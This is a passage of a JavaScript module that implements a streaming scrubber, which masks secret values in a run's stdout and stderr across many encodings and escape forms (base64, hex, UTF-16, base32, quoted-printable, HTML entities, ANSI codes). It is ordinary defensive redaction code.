      else if (uni && p >= 0x7f) s += p > 0xffff ? u(0xd800 + ((p - 0x10000) >> 10)) + u(0xdc00 + ((p - 0x10000) & 0x3ff)) : u(p);
      else s += c;
    }
    out.push(['json', s]);
  }
  return out;
}
const hexForms = (bytes) => { const lo = bytes.map((b) => hex2(b, false)).join(''); return [['hex', lo], ['hex', lo.toUpperCase()]]; };
/** UTF-8 bytes → text the way a stream decoder reads them (the door's StringDecoder; WHATWG: each maximal ill-formed run
 *  is one U+FFFD) — how a child's UTF-16 output reaches the scrubber. */
function decodeUtf8(bytes) {
  let s = '', i = 0;
  while (i < bytes.length) {
    const b = bytes[i];
    if (b < 0x80) { s += String.fromCharCode(b); i++; continue; }
    const need = b >= 0xc2 && b <= 0xdf ? 1 : b >= 0xe0 && b <= 0xef ? 2 : b >= 0xf0 && b <= 0xf4 ? 3 : 0;
    if (!need) { s += '�'; i++; continue; }
    let cp = b & (need === 1 ? 0x1f : need === 2 ? 0x0f : 0x07), lo = b === 0xe0 ? 0xa0 : b === 0xf0 ? 0x90 : 0x80, hi = b === 0xed ? 0x9f : b === 0xf4 ? 0x8f : 0xbf, j = i + 1;
    for (; j <= i + need; j++) { const c = bytes[j]; if (c === undefined || c < lo || c > hi) break; cp = (cp << 6) | (c & 0x3f); lo = 0x80; hi = 0xbf; }
    if (j <= i + need) { s += '�'; i = j; continue; }
    s += String.fromCodePoint(cp); i = j;
  }
  return s;
}
/** UTF-16 little- and big-endian, as the door's UTF-8 decoder reads those bytes (an ASCII value: its characters with a NUL after / before each). */
function utf16Forms(v) {
  const le = [], be = [];
  for (let i = 0; i < v.length; i++) { const u = v.charCodeAt(i); le.push(u & 255, u >> 8); be.push(u >> 8, u & 255); }
  return [['utf16', decodeUtf8(le)], ['utf16', decodeUtf8(be)]];
}
const B32 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
/** base32 (RFC 4648 §6), padded and not, upper- and lower-case. */
function base32Forms(bytes) {
  let s = '', acc = 0, bits = 0;
  for (const b of bytes) { acc = ((acc << 8) | b) & 0xffff; bits += 8; while (bits >= 5) { s += B32[(acc >> (bits - 5)) & 31]; bits -= 5; } }
  if (bits) s += B32[(acc << (5 - bits)) & 31];
  const padded = s + '='.repeat((8 - (s.length % 8)) % 8);
  return [padded, s, padded.toLowerCase(), s.toLowerCase()].map((t) => ['base32', t]);
}
/**
 * THE FORMS — THE ONE LIST of what the scrubber knows (lane vault-scrub-forms, the desk's q-043 verify M1). A form is here
 * because a REAL tool prints it by itself; `producer` names one. `spelled` forms are texts formsOf builds from the value;
 * `read` forms are VIEWS (below): the output read with one family of escapes undone, every spelled form looked for in what
 * the view reads, the ORIGINAL span masked, its escapes included. What is NOT here, and why, is the header's ③.
 */
const FORM_ROWS = Object.freeze([
  ['raw', 'spelled', 'anything that prints what it was given: curl -v (> Authorization: Bearer …), an error echoing its input, an env dump'],
  ['base64', 'spelled', 'an HTTP Basic header (curl -v), a Kubernetes Secret (kubectl get secret -o yaml), a token inside a JSON body'],
  ['percent', 'spelled', 'a URL: its query, its userinfo (curl -v, git remote -v), a form body'],
  ['json', 'spelled', 'any JSON output: kubectl -o json, gh api, a JSON log line'],
  ['hex', 'spelled', 'a byte dump in a debug log; oathtool -v (Hex secret:)'],
  ['utf16', 'spelled', 'PowerShell 5\'s > and Out-File, reg export (UTF-16LE); Java\'s writeChars (UTF-16BE)'],
  ['base32', 'spelled', 'oathtool -v (Base32 secret:), an otpauth:// URI\'s secret='],
  ['qp', 'read', 'a mail body in quoted-printable (a fetched .eml, an IMAP FETCH): =XX for a byte, a soft line break =\\r\\n anywhere in the value'],
  ['escape', 'read', 'a language\'s repr of a value with a non-ASCII byte: Python b\'…\\xc3\\xbc…\' and \'…\\u00fc…\', Node util.inspect, Rust {:?} (\\u{…}), git and bash $\'…\' (octal)'],
  ['entity', 'read', 'an HTML page or an XML file showing the value: a template\'s escaping (&amp; &quot; &#x27; &#61;), a .NET or Maven config'],
  ['ansi', 'read', 'a terminal with colours: grep --color, git diff --color-words, a test runner\'s coloured diff — SGR escapes between the characters'],
  ['wrap', 'read', 'a wrapped line: a base64 mail body or openssl base64 output at 64 / 76 columns'],
].map(([form, how, producer]) => Object.freeze({ form, how, producer })));
const FORMS = Object.freeze(FORM_ROWS.map((r) => r.form));
/** A value → its SPELLED forms [{ form, text }] (distinct texts, the raw first). */
function formsOf(value) {
  const v = String(value == null ? '' : value), bytes = utf8(v);
  const all = [['raw', v],
    ...base64Forms(bytes),
    ...percentForms(bytes), ...jsonForms(v), ...hexForms(bytes), ...utf16Forms(v), ...base32Forms(bytes)];
  const seen = new Set(), out = [];
  for (const [form, text] of all) if (text && !seen.has(text)) { seen.add(text); out.push(Object.freeze({ form, text })); }
  return out;
}
const reEscape = (s) => s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
const NAMED_ENTITY = Object.freeze({ amp: '&', lt: '<', gt: '>', quot: '"', apos: '\'' });
const SIMPLE_ESCAPE = Object.freeze({ '\\': '\\', '\'': '\'', '"': '"', n: '\n', t: '\t', r: '\r' });
const textOf = (cp) => (cp >= 0 && cp <= 0x10ffff ? { text: String.fromCodePoint(cp) } : null);
/**
 * THE VIEWS — the `read` forms. A view's TOKEN is a short run that starts with one of its `triggers` (never found inside a
 * token) and stands for zero or more characters: `read(token)` → { byte } (joined with its neighbours as UTF-8, a byte that
 * is not UTF-8 read as Latin-1) | { text } ('' = dropped: a soft break, a colour) | null (not a token after all: read as it
 * is). `max` = the longest token, so a stream holds back an unfinished one; `pairs` = the trigger also escapes itself (`\\`),
 * so a run of triggers is read in pairs from its start and a stream holds back from the run's last pair boundary.
 */
const VIEWS = Object.freeze([
  { form: 'qp', triggers: '=', max: 3, re: /=(?:\r?\n|[0-9A-Fa-f]{2})/g, read: (t) => (t[1] === '\r' || t[1] === '\n' ? { text: '' } : { byte: parseInt(t.slice(1), 16) }) },
  { form: 'escape', triggers: '\\', max: 10, pairs: true, re: /\\(?:x[0-9A-Fa-f]{2}|[0-3][0-7]{2}|u\{[0-9A-Fa-f]{1,6}\}|u[0-9A-Fa-f]{4}|U[0-9A-Fa-f]{8}|[\\'"ntr])/g,
    read: (t) => (t[1] === 'x' ? { byte: parseInt(t.slice(2), 16) } : t[1] >= '0' && t[1] <= '3' ? { byte: parseInt(t.slice(1), 8) }
      : t[1] === 'u' && t[2] === '{' ? textOf(parseInt(t.slice(3, -1), 16)) : t[1] === 'u' ? { text: String.fromCharCode(parseInt(t.slice(2), 16)) }
        : t[1] === 'U' ? textOf(parseInt(t.slice(2), 16)) : { text: SIMPLE_ESCAPE[t[1]] }) },
  { form: 'entity', triggers: '&', max: 10, re: /&(?:#[0-9]{1,7};|#[xX][0-9A-Fa-f]{1,6};|amp;|lt;|gt;|quot;|apos;)/g,
    read: (t) => (t[1] !== '#' ? { text: NAMED_ENTITY[t.slice(1, -1)] } : textOf(t[2] === 'x' || t[2] === 'X' ? parseInt(t.slice(3, -1), 16) : parseInt(t.slice(2, -1), 10))) },
  { form: 'ansi', triggers: '\x1b', max: 35, re: /\x1b(?:\[[0-9;:?]{0,32}[mK]|[()][0-9A-Za-z])/g, read: () => ({ text: '' }) },
  { form: 'wrap', triggers: '\r\n', max: 1, re: /[\r\n]/g, read: () => ({ text: '' }) },
].map((v) => Object.freeze(v)));
const UTF8_NEED = (b) => (b >= 0xc2 && b <= 0xdf ? 1 : b >= 0xe0 && b <= 0xef ? 2 : b >= 0xf0 && b <= 0xf4 ? 3 : 0);
/**
 * What view `vw` reads in buf[0, end) → null when no token is there (it reads what the plain text says), else { sk, at, to,
 * spans, end }: sk[i] stands for buf[at[i], to[i]); `spans` = [start, end) of every run a token-made character covers (a
 * stream never cuts inside one); `end` moves back over a trailing UTF-8 character still missing a byte (not `final`).
 */
function readView(vw, buf, end, final) {
  let sk = '', i = 0, any = false, m;
  const at = [], to = [], spans = [], bytes = [];
  const lit = (a, b) => { for (let k = a; k < b; k++) { sk += buf[k]; at.push(k); to.push(k + 1); } };
  const put = (text, a, b) => { for (let k = 0; k < text.length; k++) { sk += text[k]; at.push(a); to.push(b); } if (b - a > 1) spans.push(a, b); };
  const flush = () => {
    for (let k = 0; k < bytes.length;) {
      const [b, s] = bytes[k], need = UTF8_NEED(b);
      let cp = b & (need === 1 ? 0x1f : need === 2 ? 0x0f : 0x07), j = k + 1;
      for (; need && j <= k + need && j < bytes.length; j++) { const c = bytes[j][0]; if (c < 0x80 || c > 0xbf) break; cp = (cp << 6) | (c & 0x3f); }
      const whole = need && j === k + need + 1 && cp >= [0, 0x80, 0x800, 0x10000][need] && cp <= 0x10ffff && !(cp >= 0xd800 && cp <= 0xdfff);
      if (whole) { put(String.fromCodePoint(cp), s, bytes[j - 1][2]); k = j; } else { put(String.fromCharCode(b), s, bytes[k][2]); k++; }
    }
    bytes.length = 0;
  };
  vw.re.lastIndex = 0;
  while ((m = vw.re.exec(buf)) !== null) {
    const s = m.index, e = s + m[0].length;
    if (e > end) break;
    const r = vw.read(m[0]);
    if (!r) continue;
    any = true;
    if (s > i) { flush(); lit(i, s); }
    if (r.byte != null) bytes.push([r.byte, s, e]);
    else if (r.text) { flush(); put(r.text, s, e); }
    else if (e - s > 1) spans.push(s, e);   // dropped (a soft break, a colour) — bytes on either side still join: =C3=\r\n=BC is one ü
    i = e;
  }
  if (!any) return null;
  if (!final && i === end && bytes.length) {   // a character still missing a byte at the end waits for the next chunk
    let k = bytes.length - 1;
    while (k > 0 && bytes[k][0] >= 0x80 && bytes[k][0] <= 0xbf) k--;
    if (UTF8_NEED(bytes[k][0]) > bytes.length - 1 - k) { end = bytes[k][1]; bytes.length = k; i = end; }
  }
  flush(); lit(i, end);
  return { sk, at, to, spans, end };
}
/**
 * A RUN's scrubber — ONE per run, fed by every stream of it (the desk's «one window per run»). `secrets` = [{ ref | label,
 * value }] — `ref` a parsed reference (its placeholder) or `label` the `<store>/<row>/<field>`. → { push(stream, chunk) →
 * { <stream>: text }, end() → { <stream>: text }, hits, bytes (UTF-8 bytes of the spans it replaced — the audit's count),
 * byForm, window }.
 * WHAT IT READS: each stream's own text, and — while more than one stream has text kept back — the run's text in ARRIVAL
 * order, so a value split between stdout and stderr is seen whole AND a value inside one stream is never lost to the other's
 * chunks between its characters. A find masks its span on every stream it covers (each gets the placeholder).
 * WHAT IT KEEPS BACK: per stream, the last `window` (longest spelled form − 1) characters as every view reads them, a token
 * not finished yet, and the run's last `window` characters in arrival order; a find is handed on whole or kept back whole
 * (on every stream it covers) — an occurrence that starts before the kept text is whole in the buffer, one that starts
 * inside it waits for the next chunk (or `end`). One stream: chunked or whole, the output is the same (test-vault-run-model).
 * Hand it text from a streaming decoder (StringDecoder / TextDecoder { stream: true }) — never bytes cut mid-character.
 * A value under MIN_MASK_BYTES throws `entry_too_short_to_mask` (runVerdict refused it already).
 */
function createRunMasker(secrets, streams = ['out', 'err']) {
  const table = new Map();
  for (const s of Array.isArray(secrets) ? secrets : []) {
    const v = String(s && s.value != null ? s.value : '');
    if (bytesOf(v) < MIN_MASK_BYTES) { const e = new Error(WORDS.entry_too_short_to_mask); e.code = 'entry_too_short_to_mask'; throw e; }
    const ph = placeholderOf(s.ref && typeof s.ref === 'object' ? s.ref : s.label != null ? { label: s.label } : parseRef(String(s.ref)) || String(s.ref));
    for (const f of formsOf(v)) if (!table.has(f.text)) table.set(f.text, { ph, form: f.form });
  }
  const texts = [...table.keys()].sort((a, b) => b.length - a.length);
  const re = texts.length ? new RegExp(texts.map(reEscape).join('|'), 'g') : null;
  const maxLen = texts.length ? texts[0].length : 1;
  const W = maxLen - 1;
  const names = [...streams];
  let held = [];   // [[stream, text]] in arrival order — what the run has not handed on yet
  const st = { hits: 0, bytes: 0, byForm: {} };
  /** ONE text read plainly and through every view → { safe (what is decided), finds [{ s, e, ph, form }], spans [[s, e]] }. */
  function scan(buf, final) {
    const L = buf.length;
    let safe = final ? L : L - W;
    const views = [];
    for (const vw of VIEWS) {
      let end = L;
      if (!final) for (let k = Math.max(0, L - vw.max + 1); k < L; k++) if (vw.triggers.includes(buf[k])) {
        if (vw.pairs) { let j = k; while (j > 0 && buf[j - 1] === buf[k]) j--; k = j + 2 * Math.floor((k - j) / 2); }   // the last pair boundary of the run (a run is read in pairs from its start)
        end = k; break;
      }
      const r = readView(vw, buf, end, final);
      if (!final) { const len = r ? r.sk.length : end, ss = len - W; safe = Math.min(safe, ss <= 0 ? 0 : !r ? ss : ss < len ? r.at[ss] : r.end); }
      if (r) views.push([vw, r]);
    }
    safe = Math.max(0, safe);
    const finds = [], spans = [];
    const look = (sk, r, form) => {
      re.lastIndex = 0;
      let m;
      while ((m = re.exec(sk)) !== null) {
        const s = r ? r.at[m.index] : m.index;
        if (s >= safe) break;
        const t = table.get(m[0]);
        finds.push({ s, e: r ? r.to[m.index + m[0].length - 1] : m.index + m[0].length, ph: t.ph, form: form || t.form });
      }
    };
    look(buf, null, null);
    for (const [vw, r] of views) { look(r.sk, r, vw.form); for (let k = 0; k < r.spans.length; k += 2) spans.push([r.spans[k], r.spans[k + 1]]); }
    return { safe, finds, spans };
  }
  function step(final) {
    const out = {}; for (const k of names) out[k] = '';
    if (!held.length) return out;
    const own = new Map();   // stream → its kept-back text
    for (const [k, x] of held) own.set(k, (own.get(k) || '') + x);
    if (!re) { for (const [k, x] of own) out[k] += x; held = []; return out; }
    // GROUPS: a find (or one token / joined character a view read) → its range on each stream it covers, [a, b) in that
    // stream's own text — handed on whole, or kept back whole on every one of them
    const groups = [], cut = new Map();
    for (const [k, x] of own) {
      const sc = scan(x, final);
      cut.set(k, sc.safe);
      for (const f of sc.finds) groups.push({ r: [[k, f.s, f.e]], ph: f.ph, form: f.form });
      for (const [a, b] of sc.spans) groups.push({ r: [[k, a, b]], tok: true });
    }
    if (own.size > 1) {   // the run's text in arrival order: a value split between the pipes
      const all = held.map((x) => x[1]).join(''), streamAt = [], idxAt = [], seen = new Map();
      for (const [k, x] of held) for (let j = 0; j < x.length; j++) { const i = seen.get(k) || 0; streamAt.push(k); idxAt.push(i); seen.set(k, i + 1); }
      const rangesOf = (a, b) => { const m = new Map(); for (let i = a; i < b; i++) { const k = streamAt[i], x = m.get(k); if (x) x[2] = idxAt[i] + 1; else m.set(k, [k, idxAt[i], idxAt[i] + 1]); } return [...m.values()]; };
      const sc = scan(all, final);
      if (!final) { const n = new Map(); for (let i = 0; i < sc.safe; i++) n.set(streamAt[i], (n.get(streamAt[i]) || 0) + 1); for (const [k] of own) cut.set(k, Math.min(cut.get(k), n.get(k) || 0)); }
      for (const f of sc.finds) groups.push({ r: rangesOf(f.s, f.e), ph: f.ph, form: f.form });
      for (const [a, b] of sc.spans) groups.push({ r: rangesOf(a, b), tok: true });
    }
    if (!final) for (let moved = true; moved;) {   // never cut inside a group: one not wholly before the cuts is kept back whole
      moved = false;
      for (const g of groups) {
        if (g.r.every(([k, , b]) => b <= cut.get(k))) continue;
        for (const [k, a] of g.r) if (a < cut.get(k)) { cut.set(k, a); moved = true; }
      }
    }
    for (const [k, x] of own) {
      const c = cut.get(k);
      const masks = groups.filter((g) => !g.tok && g.r.every(([j, , b]) => b <= cut.get(j))).flatMap((g) => g.r.filter(([j]) => j === k).map(([, a, b]) => ({ a, b, ph: g.ph, form: g.form })));
      masks.sort((p, q) => p.a - q.a || q.b - p.b);
      let i = 0, last = null;
      for (const m of masks) {
        if (last && m.a < last.b) { if (m.b > last.b) { st.bytes += bytesOf(x.slice(last.b, m.b)); last.b = m.b; i = m.b; } continue; }   // overlapping finds: one placeholder
        out[k] += x.slice(i, m.a) + m.ph;
        st.hits++; st.bytes += bytesOf(x.slice(m.a, m.b)); st.byForm[m.form] = (st.byForm[m.form] || 0) + 1;
        last = { b: m.b }; i = m.b;
      }
      out[k] += x.slice(i, c);
    }
    const used = new Map(), next = [];
    for (const [k, x] of held) {
      const u = used.get(k) || 0, keep = x.slice(Math.max(0, cut.get(k) - u));
      used.set(k, u + x.length);
      if (keep) { const p = next[next.length - 1]; if (p && p[0] === k) p[1] += keep; else next.push([k, keep]); }
    }
    held = next;
    return out;
  }
  return {
    push(stream, chunk) {
      if (!names.includes(stream)) throw new TypeError(`no such stream: ${stream}`);
      const t = String(chunk == null ? '' : chunk);
      if (t) { const last = held[held.length - 1]; if (last && last[0] === stream) last[1] += t; else held.push([stream, t]); }
      return step(false);
    },
    end: () => step(true),
    get hits() { return st.hits; }, get bytes() { return st.bytes; }, get byForm() { return { ...st.byForm }; }, window: W, streams: names,
  };
}
/** ONE stream's scrubber (a whole text, the belt's): the run masker with one stream. → { push(chunk) → text, end() → text, hits, bytes, byForm, window }. */
function createMasker(secrets) {
  const m = createRunMasker(secrets, ['out']);
  return { push: (chunk) => m.push('out', chunk).out, end: () => m.end().out, get hits() { return m.hits; }, get bytes() { return m.bytes; }, get byForm() { return m.byForm; }, window: m.window };
}
/** One whole text scrubbed (a card's command, a short output, the output belt's sink text). */
function maskText(text, secrets) { const m = createMasker(secrets); return m.push(text) + m.end(); }

module.exports = {
  SCHEME, MIN_MASK_BYTES, CMD_MAX, TEMPLATE_MAX, TIMEOUT_DEFAULT_S, TIMEOUT_MAX_S, OUTPUT_MAX_BYTES, ASK_TTL_MS, ALWAYS_TTLS, ALWAYS_DEFAULT, SHAPE_V, SHAPE_NOTE, WORDS, refusalOf,
  parseRef, scanRefs, renderTemplate, placeholderOf, agentScopeOf, ownsAgentEntry, forHostOf, sameHost, isFreeEntry, refFor: refOf,
  INJECTIONS, injectionOf, ENV_HIJACK, ENV_CONFIG, envRefusedOf,
  TOOL_ROWS, SHELLS, INTERPRETERS, KNOWN_TOOLS, toolNameOf, knownToolOf, refusedTool, toolKindOf, targetOf, conninfoHosts,
  RUN_FLAGS, parseRunArgs, timeoutOf, planOf, materialize,
  shapeOf, shapeKeyOf, OWN_DOORS, RUNNABLE_STORES, ownDoorOf, awayOf, runVerdict,
  FORMS, FORM_ROWS, VIEWS, formsOf, createMasker, createRunMasker, maskText,
};
